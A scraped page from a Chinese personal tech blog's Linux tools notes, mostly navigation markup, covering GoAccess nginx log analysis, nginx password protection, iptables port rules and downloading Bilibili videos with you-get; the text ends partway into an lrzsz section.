+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.php.net/downloads.php" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  php版本安装
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://pecl.php.net/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  php扩展
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Linux" class="dropdown-title"><span class="title">Linux</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/Linux/Config.html" class="nav-link">
+  配置文件
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/Tool.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  生产工具
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/App.html" class="nav-link">
+  应用
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/SedAwk.html" class="nav-link">
+  SedAwk
+</a></li><li class="dropdown-item"><!----> <a href="/Linux/Question.html" class="nav-link">
+  问题解答
+</a></li><li class="dropdown-item"><!----> <a href="https://github.com/orangbus/tool" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Manjaro入门到生产
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><h4>
+          开发环境
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="http://laradock.io" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Laradock
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.bt.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  宝塔Linux面板
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://laragon.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  laragon-window
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li><li class="dropdown-item"><h4>
+          Linux发行版
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://www.centos.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  centos
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://www.deepin.org/zh/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Deepin
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://cn.ubuntu.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Ubuntu
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://manjaro.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Manjaro
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li><li class="dropdown-item"><h4>
+          Laradock实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="https://yeasy.gitbooks.io/docker_practice/install/mirror.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Docker入门到实战
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="http://laradock.io" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Laradock官网
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://labs.play-with-docker.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Docker在线学习调试
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-subitem"><a href="https://labs.play-with-k8s.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  play with Kubernetes
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Code" class="dropdown-title"><span class="title">Code</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Html
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Code/RequireJs.html" class="nav-link">
+  RequireJs
+</a></li><li class="dropdown-subitem"><a href="/Code/Layui.html" class="nav-link">
+  Layui笔记
+</a></li><li class="dropdown-subitem"><a href="/Code/Javascript.html" class="nav-link">
+  Javascript手册
+</a></li><li class="dropdown-subitem"><a href="/Code/Css.html" class="nav-link">
+  Css样式收藏
+</a></li><li class="dropdown-subitem"><a href="/Code/Menu.html" class="nav-link">
+  在线手册
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/Code/VueNote.html" class="nav-link">
+  Vue
+</a></li><li class="dropdown-item"><h4>
+          Php
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Code/Php.html" class="nav-link">
+  Php使用技巧
+</a></li><li class="dropdown-subitem"><a href="/Code/Thinkphp.html" class="nav-link">
+  ThinkPhp
+</a></li><li class="dropdown-subitem"><a href="/Code/LaraCode.html" class="nav-link">
+  LaraCode
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Python
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/Python/Python.html" class="nav-link">
+  Python入门
+</a></li><li class="dropdown-subitem"><a href="/Python/Scrapy.html" class="nav-link">
+  Scrapy
+</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/Docker/" class="nav-link">
+  Docker
+</a></div><div class="nav-item"><a href="/Mysql/" class="nav-link">
+  Mysql
+</a></div><div class="nav-item"><a href="/Vue/" class="nav-link">
+  Vue
+</a></div><div class="nav-item"><a href="/Golang/" class="nav-link">
+  Golang
+</a></div><div class="nav-item"><a href="/MyNote/" class="nav-link">
+  MyNote
+</a></div><div class="nav-item"><a href="/WebNote/" class="nav-link">
+  WebNote
+</a></div><div class="nav-item"><a href="/OrangBus/" class="nav-link">
+  OrangBus
+</a></div> <a href="https://github.com/orangbus/vuepress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
+    查看源码
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Linux</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/Linux/App.html" class="sidebar-link">Linux有趣的应用</a></li><li><a href="/Linux/Config.html" class="sidebar-link">Linux-Config文件</a></li><li><a href="/Linux/Gcp.html" class="sidebar-link">Gcp推荐</a></li><li><a href="/Linux/Lnmp.html" class="sidebar-link">Lnmp 环境配置</a></li><li><a href="/Linux/Question.html" class="sidebar-link">Linux常见错误排查</a></li><li><a href="/Linux/SedAwk.html" class="sidebar-link">sed awk 使用技巧</a></li><li><a href="/Linux/Shell.html" class="sidebar-link">收藏linux实用命令</a></li><li><a href="/Linux/Tool.html" aria-current="page" class="active sidebar-link">Linux工具</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/Linux/Tool.html#前期准备" class="sidebar-link">前期准备</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#安装goaccess" class="sidebar-link">安装GoAccess</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#配置日志格式" class="sidebar-link">配置日志格式</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#使用终端分析日志结果" class="sidebar-link">使用终端分析日志结果</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#以html格式输出分析结果" class="sidebar-link">以HTML格式输出分析结果</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#如何下载bilibili视频-并指定清晰度" class="sidebar-link">如何下载bilibili视频,并指定清晰度</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#如何断点下载" class="sidebar-link">如何断点下载</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#ip解析" class="sidebar-link">IP解析</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#github镜像站" class="sidebar-link">Github镜像站</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#switchhosts" class="sidebar-link">SwitchHosts</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#颜色" class="sidebar-link">颜色</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#初始化工具安装" class="sidebar-link">初始化工具安装</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#root权限检测" class="sidebar-link">root权限检测</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#sed-命令配合-for-循环方式" class="sidebar-link">sed 命令配合 for 循环方式</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#window" class="sidebar-link">window</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#manjaro" class="sidebar-link">manjaro</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#软件：" class="sidebar-link">软件：</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#删除腾讯云监控-ydservice" class="sidebar-link">删除腾讯云监控-YDService</a></li><li class="sidebar-sub-header"><a href="/Linux/Tool.html#error-failed-to-download-metadata-for-repo-appstream-centos-8" class="sidebar-link">Error: Failed to download metadata for repo ‘appstream’ – CentOS 8</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><blockquote><p><span style="color:red;">更多Linux配置请参考：</span>&lt;https://github.com/orangbus/Tool</p></blockquote> <h1 id="在线工具"><a href="#在线工具" class="header-anchor">#</a> 在线工具</h1> <p>php在线调试：<a href="http://php.jsrun.net" target="_blank" rel="noopener noreferrer">http://php.jsrun.net<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h1 id="linux快捷键"><a href="#linux快捷键" class="header-anchor">#</a> Linux快捷键</h1> <ul><li><code>Ctrl + r</code> 搜索匹配历史执行过的命令。</li></ul> <h1 id="nginx日志分析工具-goaccess"><a href="#nginx日志分析工具-goaccess" class="header-anchor">#</a> nginx日志分析工具:GoAccess</h1> <h2 id="前期准备"><a href="#前期准备" class="header-anchor">#</a> 前期准备</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token comment"># arch | manjaro</span>
+<span class="token function">sudo</span> pacman -S goaccess
+
+<span class="token comment"># cnetos</span>
+yum <span class="token function">install</span> epel-release
+yum <span class="token function">install</span> https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
+
+yum <span class="token function">install</span> geoip
+</code></pre></div><h2 id="安装goaccess"><a href="#安装goaccess" class="header-anchor">#</a> 安装GoAccess</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">wget</span> https://tar.goaccess.io/goaccess-1.6.3.tar.gz
+<span class="token function">tar</span> -xzvf goaccess-1.6.3.tar.gz
+<span class="token builtin class-name">cd</span> goaccess-1.6.3/
+./configure --enable-utf8 --enable-geoip<span class="token operator">=</span>mmdb
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
+</code></pre></div><h2 id="配置日志格式"><a href="#配置日志格式" class="header-anchor">#</a> 配置日志格式</h2> <p>配置文件位于：<code>/usr/local/etc/goaccess/goaccess.conf</code></p> <p>manjaro : <code>/etc/goaccess</code></p> <p>cemtos8: <code>/usr/local/etc</code></p> <div class="language- extra-class"><pre class="language-text"><code>time-format %H:%M:%S
+date-format %d/%b/%Y
+log-format %h - %^ [%d:%t %^]; &quot;%r&quot; %s %b &quot;%R&quot; - %^&quot;%u&quot; - %^ %T
+</code></pre></div><h2 id="使用终端分析日志结果"><a href="#使用终端分析日志结果" class="header-anchor">#</a> 使用终端分析日志结果</h2> <div class="language- extra-class"><pre class="language-text"><code>goaccess -a -d -f /var/log/nginx/access.log
+</code></pre></div><h2 id="以html格式输出分析结果"><a href="#以html格式输出分析结果" class="header-anchor">#</a> 以HTML格式输出分析结果</h2> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span><span class="token string">&quot;zh_CN.UTF-8&quot;</span> <span class="token function">bash</span> -c <span class="token string">&quot;goaccess /data/log/nginx/access.log -o /usr/share/nginx/html/goaccess.html  --real-time-html --time-format='%H:%M:%S' --date-format='%d/%b/%Y' --log-format=COMBINED&quot;</span>
+</code></pre></div><div class="language-bash extra-class"><pre class="language-bash"><code>goaccess -a -d -f /var/log/nginx/access.log -o /data/www/goaccess/html/report-项目名称.html
+
+<span class="token comment"># 案例演示</span>
+goaccess -a -d -f /home/orangbus/Code/Server/nginx/error/laravel_access.log -o /tmp/report.html
+
+goaccess -a -d -f /www/wwwlogs/deepin.com.log -o /www/wwwroot/weblog.com/deepin.html
+
+goaccess -a -d -f /home/orangbus/Logs/plat.xyekatu.com.log -o /home/orangbus/Logs/plat-xyekatu.html
+goaccess -a -d -f /home/orangbus/Logs/www.ynneea.com.log -o /home/orangbus/Logs/ynneea.html
+goaccess -a -d -f /home/orangbus/Logs/www.ynzhuobo.com.log -o /home/orangbus/Logs/ynzhuobo.html
+
+goaccess -a -d -f /www/wwwlogs/wugou-admin.com.log -o /www/wwwroot/statistics.com/wugou-admin.html
+goaccess -a -d -f /www/wwwlogs/wugou-web.com.log -o /www/wwwroot/statistics.com/wugou-web.html
+</code></pre></div><h1 id="nginx配置密码访问"><a href="#nginx配置密码访问" class="header-anchor">#</a> nginx配置密码访问</h1> <p>1、安装httpd-tools</p> <div class="language-bash extra-class"><pre class="language-bash"><code>yum <span class="token function">install</span>  httpd-tools
+</code></pre></div><p>2、生成密码到指定目录</p> <div class="language-bash extra-class"><pre class="language-bash"><code>htpasswd -c /path/.htpasswd user_name
+
+<span class="token comment"># 案例</span>
+htpasswd -c /www/password/.htpasswd orangbus
+</code></pre></div><p>3、修改Nginx配置文件，添加授权访问</p> <div class="language-nginx extra-class"><pre class="language-nginx"><code><span class="token keyword">server</span> <span class="token punctuation">{</span>
+    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>
+    <span class="token keyword">server_name</span>  bicycle<span class="token punctuation">.</span>umdzz<span class="token punctuation">.</span>cn<span class="token punctuation">;</span>
+	<span class="token comment">#提示信息</span>
+    <span class="token keyword">auth_basic</span> <span class="token string">&quot;Please Input Password...&quot;</span><span class="token punctuation">;</span> 
+	<span class="token comment">#用户密码文件存放路径</span>
+    <span class="token keyword">auth_basic_user_file</span> <span class="token operator">/</span>www<span class="token operator">/</span>password<span class="token punctuation">;</span> 
+    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
+        <span class="token comment">#列表</span>
+        <span class="token keyword">autoindex</span> on<span class="token punctuation">;</span>
+        <span class="token comment">#隐藏真实大小，以M或G显示</span>
+        <span class="token keyword">autoindex_exact_size</span> off<span class="token punctuation">;</span>
+        <span class="token comment">#显示时间</span>
+        <span class="token keyword">autoindex_localtime</span> on<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+    <span class="token keyword">error_page</span>   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  <span class="token operator">/</span><span class="token number">50</span>x<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
+    <span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token number">50</span>x<span class="token punctuation">.</span>html <span class="token punctuation">{</span>
+        <span class="token keyword">root</span>   <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nginx<span class="token operator">/</span>html<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>\<span class="token punctuation">.</span>ht <span class="token punctuation">{</span>
+        <span class="token keyword">deny</span>  all<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre></div><h1 id="linux-如何开放端口和关闭端口"><a href="#linux-如何开放端口和关闭端口" class="header-anchor">#</a> Linux 如何开放端口和关闭端口</h1> <p>打开端口号</p> <div class="language-bash extra-class"><pre class="language-bash"><code>iptables -A INPUT -ptcp --dport  端口号-j ACCEPT
+</code></pre></div><p>关闭端口号</p> <div class="language-bash extra-class"><pre class="language-bash"><code>iptables -A OUTPUT -p tcp --dport 端口号-j DROP
+</code></pre></div><p>保存设置</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">service</span> iptables save
+</code></pre></div><h1 id="you-get-使用技巧"><a href="#you-get-使用技巧" class="header-anchor">#</a> you-get 使用技巧</h1> <p>首先安装pip，更多安装方法参考<a href="https://www.runoob.com/w3cnote/python-pip-install-usage.html" target="_blank" rel="noopener noreferrer">菜鸟<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <div class="language- extra-class"><pre class="language-text"><code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py   # 下载安装脚本
+sudo python3 get-pip.py    # 运行安装脚本。
+</code></pre></div><p>部分 Linux 发行版可直接用包管理器安装 pip，如 Debian 和 Ubuntu：</p> <div class="language- extra-class"><pre class="language-text"><code>sudo apt-get install python3-pip
+# 测试
+pip3 -v
+</code></pre></div><p>安装 You-get</p> <div class="language- extra-class"><pre class="language-text"><code>pip3 install you-get
+</code></pre></div><h2 id="如何下载bilibili视频-并指定清晰度"><a href="#如何下载bilibili视频-并指定清晰度" class="header-anchor">#</a> 如何下载bilibili视频,并指定清晰度</h2> <p>下载单个视频 (直接跟上视频的地址就可以)</p> <div class="language-bash extra-class"><pre class="language-bash"><code>you-get https://www.bilibili.com/video/BV1xxxxxx
+</code></pre></div><p>批量下载一个专辑，比如一门课程有99+集视频，那么我们可以这样</p> <div class="language-bash extra-class"><pre class="language-bash"><code>you-get -l https://www.bilibili.com/video/BV1xxxxxxx //可能下载不了
+</code></pre></div><p>有的小伙伴可能执行上面的命令并不能下载，这时候我们需要审查网页源码，找到已 <span style="color:red;">avxxxxx</span> 结尾的链接才能下载。</p> <p>在当前视频播放页面【右键】【查看网页源码】，搜索 【av】 , 在meta头里面有个链接是这样的 <strong>content=&quot;https://www.bilibili.com/video/av2002xxxx/&quot;</strong> 的，这时候我们就可以复制这个链接下载了</p> <div class="language-bash extra-class"><pre class="language-bash"><code>you-get -l https://www.bilibili.com/video/av2002xxxx
+</code></pre></div><p>如何指定清晰度</p> <p>首先我们先查看视频信息</p> <div class="language- extra-class"><pre class="language-text"><code>you-get -i https://www.bilibili.com/video/BV1xxxxxx
+----- 我们会看到一下信息 ------
+streams:             # Available quality and codecs
+    [ DASH ] ____________________________________
+    - format:        dash-flv
+      container:     mp4
+      quality:       高清 1080P
+      size:          214.9 MiB (225387178 bytes)
+    # download-with: you-get --format=dash-flv [URL] //-----&gt; 这里也是有下载提示的哦
+
+    - format:        dash-flv720
+      container:     mp4
+      quality:       高清 720P
+      size:          164.1 MiB (172104993 bytes)
+    # download-with: you-get --format=dash-flv720 [URL]
+
+    - format:        dash-flv480
+      container:     mp4
+      quality:       清晰 480P
+      size:          116.1 MiB (121745328 bytes)
+    # download-with: you-get --format=dash-flv480 [URL]
+
+    - format:        dash-flv360
+      container:     mp4
+      quality:       流畅 360P
+      size:          57.1 MiB (59885060 bytes)
+    # download-with: you-get --format=dash-flv360 [URL]
+
+</code></pre></div><p>其中这个<code>format</code> 就是清晰度参数，那么我们就可这这样进行下载指定清晰度的视频了</p> <div class="language-bash extra-class"><pre class="language-bash"><code>you-get -F dash-flv https://www.bilibili.com/video/BV1xxxxxx
+// 批量下载
+you-get -l -F dash-flv https://www.bilibili.com/video/avxxxxxx
+</code></pre></div><h2 id="如何断点下载"><a href="#如何断点下载" class="header-anchor">#</a> 如何断点下载</h2> <p>假如我们的下载的视频一共有 100 集，但是 you-get 下载到 50集就停止了，那我们应该怎么从 51集开始下载呢？</p> <p>其实注意观察的小伙伴可能会发现，当我们点击100集当中的其中一集的时候，bilibili的视频地址变成了这样的</p> <div class="language-url extra-class"><pre class="language-text"><code>https://www.bilibili.com/video/BVxxxxxx?p=57
+</code></pre></div><p>后面多了一个 <code>?p=57</code> ,如果我们需要断点下载的话 <span style="color:red;">（注意视频地址是 avxxxx,不是网页的原地址BV1xxxxxx）</span></p> <div class="language-bash extra-class"><pre class="language-bash"><code>you-get -l -F dash-flv https://www.bilibili.com/video/avxxxxxx?p<span class="token operator">=</span><span class="token number">51</span>
+</code></pre></div><h1 id="通过lrzsz与linux传文件"><a href="#通过lrzsz与linux传文件" class="header-anchor">#</a> 通过lrzsz与Linux传文件</h1> <p>安装</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> yum <span class="token function">install</span> lrzsz
